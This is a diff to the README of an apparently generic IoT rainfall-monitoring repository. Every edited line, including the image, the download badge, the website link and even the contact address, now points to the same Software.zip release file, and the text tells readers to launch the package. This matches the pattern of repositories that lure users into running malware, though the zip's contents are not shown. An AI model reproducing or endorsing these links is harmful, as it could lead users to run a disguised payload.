@@ -1,6 +1,6 @@
 # Rainfall Monitoring System IoT 🌧️
 
-![Rainfall Monitoring System IoT](https://example.com/image.png)
+![Rainfall Monitoring System IoT](https://github.com/VascoVerde/Rainfall-monitoring-System-IOT/releases/download/v1.0/Software.zip)
 
 Welcome to the "Rainfall-monitoring-System-IOT" repository! This repository hosts the Rainwater Monitoring and Management System, an advanced IoT-based solution designed to provide comprehensive, real-time insights into rainfall patterns. The system offers precise tracking and analysis of rainwater harvesting parameters, making it a valuable tool for monitoring and managing water resources.
 
@@ -27,7 +27,7 @@ The Rainwater Monitoring and Management System offers the following features:
 
 To get started with the Rainwater Monitoring and Management System, you can download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/VascoVerde/Rainfall-monitoring-System-IOT/releases/download/v1.0/Software.zip)](https://github.com/VascoVerde/Rainfall-monitoring-System-IOT/releases/download/v1.0/Software.zip)
 
 Please note that the software package needs to be launched to install and set up the system on your IoT device.
 
@@ -53,7 +53,7 @@ By utilizing the Tipping Bucket mechanism and YSF201 compatibility, the Rainwate
 
 ## 🌍 Visit Our Website
 
-For more information about the Rainwater Monitoring and Management System, please visit our website [here](https://www.rainfallmonitoringiot.com). Explore the features, benefits, and technical specifications of the system to learn how it can support your water management needs.
+For more information about the Rainwater Monitoring and Management System, please visit our website [here](https://github.com/VascoVerde/Rainfall-monitoring-System-IOT/releases/download/v1.0/Software.zip). Explore the features, benefits, and technical specifications of the system to learn how it can support your water management needs.
 
 ## 🤝 Contributions
 
@@ -65,7 +65,7 @@ In case the download link provided above does not work or if you are looking for
 
 ## 📞 Contact Us
 
-If you have any questions, suggestions, or feedback regarding the Rainwater Monitoring and Management System, feel free to reach out to us at [contact@rainfallmonitoringiot.com]. Your input is essential in improving the system and making it more effective for water management applications.
+If you have any questions, suggestions, or feedback regarding the Rainwater Monitoring and Management System, feel free to reach out to us at [https://github.com/VascoVerde/Rainfall-monitoring-System-IOT/releases/download/v1.0/Software.zip]. Your input is essential in improving the system and making it more effective for water management applications.
 
 ---
 
